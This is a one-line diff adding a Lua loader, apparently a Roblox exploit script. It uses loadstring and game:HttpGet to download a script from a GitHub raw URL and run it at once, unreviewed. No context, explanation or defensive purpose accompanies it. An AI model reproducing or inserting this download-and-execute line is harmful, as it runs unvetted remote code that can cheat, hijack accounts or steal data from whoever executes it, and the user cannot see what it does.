@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2022NOON/2022NOON-Scripts/main/Script2"))()
